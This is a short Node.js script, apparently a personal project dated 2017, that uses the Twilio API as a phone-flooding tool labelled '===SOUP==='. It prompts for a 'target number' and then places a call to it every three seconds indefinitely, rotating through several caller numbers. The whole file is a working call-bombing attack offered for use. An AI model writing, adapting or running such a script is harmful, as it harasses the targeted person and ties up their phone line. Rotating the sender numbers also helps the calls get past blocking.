/*
Misanya Liu
7/12/17
I've stared this code!
*/
let accountSid = '*************';//Config Here
let authToken = '**************';//Config Here
let client = require('twilio')(accountSid, authToken);
let readline = require('readline');

let numbers = ['+10000000000','+10000000000','+10000000000','+10000000000'];//Config Here
let toNumber = '+86**********';
let count = 1;

const calltimeout = 3000;// call time out = 3s.

const appName ='===SOUP===';
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let index = 0;
const callPhone = ()=>{
    client.calls.create({
        url: "http://demo.twilio.com/docs/voice.xml",// add your own TwiML file path here.
        to: toNumber,
        from: numbers[index++]
    }, function(err, call) {
        if(call){
            console.log(call.sid);
        }
        console.log(err);
    });

    if(index >= numbers.length){
        index = 0;
    }
}

const launchCall = ()=>{
    callPhone();
    setInterval(callPhone,calltimeout);
};

// Entrance of Main
console.log(appName);
rl.question('Enter the target numbe to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
    console.log(`Trying to call this number: ${answer}`);
    toNumber = answer;

    rl.close();

    launchCall();
});


   
